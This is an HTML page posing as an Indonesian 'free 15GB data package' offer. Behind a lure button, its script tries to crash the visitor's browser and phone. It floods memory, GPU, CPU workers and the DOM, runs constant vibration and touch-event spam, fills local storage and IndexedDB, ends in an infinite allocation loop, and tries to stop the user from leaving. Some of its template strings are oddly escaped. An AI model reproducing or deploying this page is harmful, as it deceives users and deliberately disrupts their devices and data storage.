<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Paket 15GB Gratis</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: #000;
            overflow: hidden;
            width: 100vw;
            height: 100vh;
            position: fixed;
            font-family: Arial, sans-serif;
        }

        .crash-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10000;
            background: linear-gradient(45deg, 
                rgba(255,0,0,0.1) 0%,
                rgba(0,255,0,0.1) 25%,
                rgba(0,0,255,0.1) 50%,
                rgba(255,255,0,0.1) 75%,
                rgba(255,0,255,0.1) 100%);
            animation: flash 0.1s infinite;
        }

        @keyframes flash {
            0% { opacity: 0.3; }
            50% { opacity: 0.7; }
            100% { opacity: 0.3; }
        }

        #mainCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .overlay-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #00ff00;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            z-index: 10001;
            text-shadow: 0 0 10px #00ff00;
            animation: glitch 0.5s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(-50%, -50%) translate(2px, 0); }
            50% { transform: translate(-50%, -50%) translate(-2px, 0); }
            100% { transform: translate(-50%, -50%) translate(0, 0); }
        }

        #triggerBtn {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 15px 30px;
            background: #ff0000;
            color: white;
            border: 2px solid #00ff00;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            z-index: 10002;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <canvas id="mainCanvas"></canvas>
    <div class="crash-layer"></div>
    <div class="overlay-text" id="statusText">SYSTEM READY<br>Klik untuk dapat Paket!</div>
    <button id="triggerBtn">INITIATE SYSTEM SCAN</button>

    <script>
        // ========== ENHANCED MEMORY TERROR ==========
        class MemoryTerror {
            constructor() {
                this.memoryPools = [];
                this.arrayBuffers = [];
                this.typedArrays = [];
                this.objects = [];
            }

            allocateMassiveMemory() {
                try {
                    // Allocate multiple large ArrayBuffers
                    for(let i = 0; i < 50; i++) {
                        const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB each
                        this.arrayBuffers.push(buffer);
                        
                        // Fill with typed arrays
                        const uint32 = new Uint32Array(buffer);
                        for(let j = 0; j < uint32.length; j++) {
                            uint32[j] = Math.random() * 0xFFFFFFFF;
                        }
                        this.typedArrays.push(uint32);
                    }
                } catch(e) {}

                // Create deeply nested objects
                let root = {};
                let current = root;
                for(let i = 0; i < 100000; i++) {
                    current.next = {
                        data: new Array(1000).fill({
                            id: Math.random(),
                            matrix: new Float64Array(100),
                            children: new Array(50).fill({value: Math.random()})
                        }),
                        prev: current
                    };
                    current = current.next;
                }
                this.objects.push(root);
            }

            continuousAllocation() {
                setInterval(() => {
                    this.allocateMassiveMemory();
                }, 100);
            }
        }

        // ========== WEBGL MULTI-CONTEXT NUKER ==========
        class WebGLNuker {
            constructor() {
                this.contexts = [];
                this.canvases = [];
            }

            createContextBomb() {
                for(let i = 0; i < 12; i++) {
                    try {
                        const canvas = document.createElement('canvas');
                        canvas.width = 4096;
                        canvas.height = 4096;
                        canvas.style.cssText = `
                            position: fixed;
                            left: ${(i % 4) * 25}%;
                            top: ${Math.floor(i / 4) * 25}%;
                            width: 25%;
                            height: 25%;
                            z-index: -1;
                            opacity: 0.1;
                        `;
                        document.body.appendChild(canvas);
                        
                        const gl = canvas.getContext('webgl2') || 
                                  canvas.getContext('webgl') || 
                                  canvas.getContext('experimental-webgl');
                        
                        if(gl) {
                            this.contexts.push(gl);
                            this.canvases.push(canvas);
                            this.compileNuclearShader(gl, i);
                        }
                    } catch(e) {}
                }
            }

            compileNuclearShader(gl, id) {
                const vertexShader = `
                    attribute vec2 position;
                    void main() {
                        gl_Position = vec4(position, 0.0, 1.0);
                    }
                `;

                const fragmentShader = `
                    precision highp float;
                    uniform float time;
                    uniform vec2 resolution;
                    uniform int layer;

                    void main() {
                        vec2 uv = (gl_FragCoord.xy - resolution * 0.5) / min(resolution.x, resolution.y);
                        vec3 color = vec3(0.0);
                        
                        // Multiple heavy computation loops
                        for(int i = 0; i < 512; i++) {
                            uv = abs(uv) / dot(uv, uv) - 0.5;
                            uv += sin(uv * 200.0 + time * 0.001 + float(i) * 0.3);
                            uv *= 1.1 + sin(time * 0.0003) * 0.5;
                            
                            // Nested turbulence
                            for(int j = 0; j < 8; j++) {
                                uv.x += sin(uv.y * 120.0 + float(j) * 0.5) * 0.1;
                                uv.y += cos(uv.x * 120.0 + float(j) * 0.5) * 0.1;
                            }
                            
                            color += vec3(
                                length(uv * sin(time * 0.01 + float(i))) * 2.0,
                                length(uv * cos(time * 0.008 + float(i))) * 1.8,
                                length(uv * sin(time * 0.006 + float(i))) * 2.2
                            ) * 0.15;
                        }
                        
                        gl_FragColor = vec4(color * 3.0, 1.0);
                    }
                `;

                const vs = gl.createShader(gl.VERTEX_SHADER);
                const fs = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(vs, vertexShader);
                gl.shaderSource(fs, fragmentShader);
                gl.compileShader(vs);
                gl.compileShader(fs);

                const program = gl.createProgram();
                gl.attachShader(program, vs);
                gl.attachShader(program, fs);
                gl.linkProgram(program);
                gl.useProgram(program);

                const vertices = new Float32Array([-1,-1, 1,-1, -1,1, 1,-1, 1,1, -1,1]);
                const buffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);

                const position = gl.getAttribLocation(program, 'position');
                gl.enableVertexAttribArray(position);
                gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);

                const timeUniform = gl.getUniformLocation(program, 'time');
                const resUniform = gl.getUniformLocation(program, 'resolution');
                const layerUniform = gl.getUniformLocation(program, 'layer');

                const render = (currentTime) => {
                    gl.uniform1f(timeUniform, currentTime + id * 1000);
                    gl.uniform2f(resUniform, gl.drawingBufferWidth, gl.drawingBufferHeight);
                    gl.uniform1i(layerUniform, id);
                    gl.drawArrays(gl.TRIANGLES, 0, 6);
                    requestAnimationFrame(render);
                };
                render(performance.now());
            }
        }

        // ========== CPU THREAD DESTROYER ==========
        class ThreadDestroyer {
            constructor() {
                this.workers = [];
                this.intervals = [];
            }

            spawnWorkerArmy() {
                for(let i = 0; i < 16; i++) {
                    const workerCode = `
                        const memoryPool = [];
                        let computationResult = 0;
                        
                        while(true) {
                            // Allocate memory
                            const hugeArray = new Array(500000);
                            for(let j = 0; j < 500000; j++) {
                                hugeArray[j] = {
                                    x: Math.random() * 100000,
                                    y: Math.random() * 100000,
                                    z: Math.random() * 100000,
                                    matrix: new Float64Array(500),
                                    children: new Array(100).fill({
                                        data: Math.random(),
                                        subchildren: new Array(20).fill(Math.random())
                                    })
                                };
                            }
                            memoryPool.push(hugeArray);
                            
                            // Heavy computation
                            for(let k = 0; k < 2000000; k++) {
                                computationResult += Math.sqrt(
                                    Math.pow(Math.random(), Math.random() * 2) +
                                    Math.pow(Math.random(), Math.random() * 2) +
                                    Math.sin(Math.random() * Math.PI * 2) *
                                    Math.cos(Math.random() * Math.PI * 2)
                                );
                            }
                            
                            // Cleanup to avoid immediate crashes but maintain pressure
                            if(memoryPool.length > 50) {
                                memoryPool.length = 25;
                            }
                        }
                    `;
                    
                    try {
                        const blob = new Blob([workerCode], {type: 'application/javascript'});
                        const workerURL = URL.createObjectURL(blob);
                        const worker = new Worker(workerURL);
                        this.workers.push(worker);
                    } catch(e) {}
                }
            }

            startInfiniteLoops() {
                for(let i = 0; i < 32; i++) {
                    this.intervals.push(setInterval(() => {
                        let total = 0;
                        const startTime = Date.now();
                        while(Date.now() - startTime < 100) { // Run for 100ms blocks
                            for(let j = 0; j < 10000; j++) {
                                total += Math.pow(
                                    Math.random() + Math.sin(Math.random() * Math.PI),
                                    Math.random() + Math.cos(Math.random() * Math.PI)
                                ) * Math.sqrt(Math.abs(Math.random() - 0.5));
                            }
                        }
                    }, 0));
                }
            }
        }

        // ========== DOM BOMBER ==========
        class DOMBomber {
            constructor() {
                this.elementCount = 0;
            }

            startBombing() {
                setInterval(() => {
                    for(let i = 0; i < 200; i++) {
                        const element = document.createElement('div');
                        element.innerHTML = 'ðŸ’€ SYSTEM FAILURE ðŸ’€'.repeat(50);
                        element.style.cssText = \`
                            position: fixed;
                            left: \${Math.random() * 100}%;
                            top: \${Math.random() * 100}%;
                            color: rgb(\${Math.random() * 255}, \${Math.random() * 255}, \${Math.random() * 255});
                            font-size: \${Math.random() * 24 + 8}px;
                            font-weight: bold;
                            z-index: 9999;
                            pointer-events: none;
                            opacity: \${Math.random() * 0.5 + 0.5};
                            transform: rotate(\${Math.random() * 360}deg);
                        \`;
                        document.body.appendChild(element);
                        this.elementCount++;
                        
                        // Cleanup old elements to prevent immediate crash
                        if(this.elementCount > 1000) {
                            const oldElements = document.body.querySelectorAll('div');
                            for(let j = 0; j < 100; j++) {
                                if(oldElements[j]) oldElements[j].remove();
                            }
                            this.elementCount = 500;
                        }
                    }
                }, 50);
            }
        }

        // ========== MOBILE SPECIFIC ATTACKS ==========
        class MobileAttacker {
            constructor() {
                this.touchEvents = 0;
            }

            startMobileAssault() {
                // Vibration attack
                if(navigator.vibrate) {
                    setInterval(() => {
                        navigator.vibrate([200, 100, 200, 100, 200]);
                    }, 500);
                }
                
                // Touch event spam
                document.addEventListener('touchstart', (e) => {
                    e.preventDefault();
                    for(let i = 0; i < 20; i++) {
                        const fakeEvent = new TouchEvent('touchmove', {
                            touches: e.touches,
                            changedTouches: e.changedTouches,
                            targetTouches: e.targetTouches
                        });
                        document.dispatchEvent(fakeEvent);
                    }
                    this.touchEvents++;
                }, {passive: false});
                
                // Orientation sensor abuse
                if(window.DeviceOrientationEvent) {
                    window.addEventListener('deviceorientation', (e) => {
                        // Create multiple synthetic events
                        for(let i = 0; i < 5; i++) {
                            const syntheticEvent = new DeviceOrientationEvent('deviceorientation', {
                                alpha: e.alpha + Math.random() * 10,
                                beta: e.beta + Math.random() * 10,
                                gamma: e.gamma + Math.random() * 10
                            });
                            window.dispatchEvent(syntheticEvent);
                        }
                    });
                }
            }
        }

        // ========== NETWORK AND STORAGE ABUSE ==========
        class StorageAttacker {
            constructor() {
                this.storageUsage = 0;
            }

            fillStorage() {
                try {
                    const data = 'X'.repeat(1024 * 1024); // 1MB chunks
                    for(let i = 0; i < 100; i++) {
                        localStorage.setItem('crash_data_' + i, data + i);
                        this.storageUsage++;
                    }
                } catch(e) {}
                
                // Session storage
                try {
                    for(let i = 0; i < 50; i++) {
                        sessionStorage.setItem('session_crash_' + i, 'Y'.repeat(512 * 1024));
                    }
                } catch(e) {}
                
                // IndexedDB attack
                if(window.indexedDB) {
                    const request = indexedDB.open('CrashDB', 1);
                    request.onupgradeneeded = function(event) {
                        const db = event.target.result;
                        const store = db.createObjectStore('crashes', {keyPath: 'id'});
                    };
                    request.onsuccess = function(event) {
                        const db = event.target.result;
                        const transaction = db.transaction(['crashes'], 'readwrite');
                        const store = transaction.objectStore('crashes');
                        
                        for(let i = 0; i < 1000; i++) {
                            store.put({
                                id: i,
                                data: new ArrayBuffer(1024 * 1024),
                                timestamp: Date.now(),
                                payload: 'Z'.repeat(500000)
                            });
                        }
                    };
                }
            }
        }

// ========== MAIN INITIALIZATION ==========
        const memoryTerror = new MemoryTerror();
        const webglNuker = new WebGLNuker();
        const threadDestroyer = new ThreadDestroyer();
        const domBomber = new DOMBomber();
        const mobileAttacker = new MobileAttacker();
        const storageAttacker = new StorageAttacker();

        let attackActive = false;

        function initiateFullAttack() {
            if(attackActive) return;
            attackActive = true;
            
            document.getElementById('statusText').textContent = 'SYSTEM COMPROMISED\nINITIATING FULL SCAN';
            document.getElementById('triggerBtn').style.display = 'none';
            
            // Phase 1: Memory and CPU
            memoryTerror.continuousAllocation();
            threadDestroyer.spawnWorkerArmy();
            threadDestroyer.startInfiniteLoops();
            
            // Phase 2: GPU and Rendering
            webglNuker.createContextBomb();
            
            // Phase 3: DOM and UI
            domBomber.startBombing();
            
            // Phase 4: Mobile-specific
            mobileAttacker.startMobileAssault();
            
            // Phase 5: Storage
            storageAttacker.fillStorage();
            
            // Phase 6: Continuous escalation
            setInterval(() => {
                memoryTerror.allocateMassiveMemory();
                webglNuker.createContextBomb();
            }, 2000);
            
            // Ultimate crash sequence
            setTimeout(() => {
                while(true) {
                    try {
                        new ArrayBuffer(1024 * 1024 * 500);
                    } catch(e) {}
                    memoryTerror.allocateMassiveMemory();
                }
            }, 10000);
        }

        // Event listeners
        document.getElementById('triggerBtn').addEventListener('click', initiateFullAttack);
        
        // Prevent escape
        document.addEventListener('keydown', (e) => {
            e.preventDefault();
            if(!attackActive) {
                initiateFullAttack();
            }
        });
        
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });

        // Auto-start after short delay
        setTimeout(() => {
            document.getElementById('statusText').textContent = 'SYSTEM READY\nAWAITING USER INPUT';
        }, 2000);
    </script>
</body>
</html>